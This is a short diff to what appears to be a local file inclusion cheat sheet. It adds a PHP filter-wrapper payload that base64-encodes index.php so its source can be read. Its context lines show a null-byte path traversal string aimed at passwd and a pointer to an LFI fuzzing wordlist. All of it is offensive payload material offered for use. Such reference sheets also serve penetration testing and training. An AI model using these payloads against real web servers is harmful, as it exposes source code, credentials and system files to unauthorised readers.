@@ -28,6 +28,10 @@ Append `%00`,  character following null byte will be ignored
 ../../../../../passwd%00
 ```
 
+### PHP
+```bash
+php://filter/read=convert.base64-encode/resource=index.php
+```
 ### Fuzzing
 Fuzz using `LFI-Jhaddix.txt` wordlist
 
